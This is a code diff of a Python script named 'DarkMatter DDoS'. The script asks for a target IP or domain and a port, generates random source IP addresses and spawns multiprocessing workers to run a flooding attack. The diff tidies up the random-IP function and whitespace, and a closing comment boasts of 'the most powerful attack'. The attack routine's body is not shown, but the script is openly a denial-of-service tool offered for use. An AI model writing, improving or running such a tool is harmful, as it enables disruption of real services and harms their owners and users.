@@ -3,30 +3,20 @@ import os, sys
 import time
 import multiprocessing, random
 
+
 print("Welcome To DarkMatter DDoS")
 ip = input("IP/Domain: ")
 port = int(input("Port: "))
 
 url = "http://" + str(ip)
 
-def randomip():
-  randip = []
-  randip1 = random.randint(1,255)
-  randip2 = random.randint(1,255)
-  randip3 = random.randint(1,255)
-  randip4 = random.randint(1,255)
-  
-  randip.append(randip1)
-  randip.append(randip2)
-  randip.append(randip3)
-  randip.append(randip4)
 
-  randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3])
-  return(randip)
+def randomip():
+  randip = ".".join(str(random.randint(0, 255)) for _ in range(4))
+  return randip
+
 
 print("[>>>] Starting the attack [<<<]")
-
-
 time.sleep(1)
 
 
@@ -55,4 +45,5 @@ def send2attack():
     mp.setDaemon = False
     mp.start() #Magic Starts
 
+    
 send2attack() #61 lines for the most powerful attack, cool?
